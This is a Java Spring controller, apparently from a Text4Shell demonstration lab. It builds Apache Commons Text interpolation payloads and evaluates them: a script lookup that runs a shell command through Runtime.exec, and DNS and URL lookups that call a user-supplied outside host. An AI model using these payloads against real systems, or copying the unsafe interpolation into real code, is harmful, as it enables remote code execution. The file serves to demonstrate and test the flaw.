package net.kvak.text4shell.controller;

import org.apache.commons.text.StringSubstitutor;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

@Controller
public class ExploitController {
    @GetMapping("/exploit")
    public String sploit(@RequestParam(defaultValue = "") int s,
                         @RequestParam(defaultValue = "") String interact,
                         Model model) {
        StringBuilder sb = new StringBuilder();
        switch (s) {
            case 1:
                sb.append("${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/blop')}");
                break;
            case 2:
                sb.append("${dns:address|");
                sb.append(interact);
                sb.append("}");
                break;
            case 3:
                if (!interact.trim().startsWith("http")) {
                    sb.append("${url:UTF-8:http://");
                } else {
                    sb.append("${url:UTF-8:");
                }
                sb.append(interact);
                sb.append("}");
                break;
        }
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String exploit = interpolator.replace(sb);
        model.addAttribute("exploit", sb);
        return "result";
    }
}
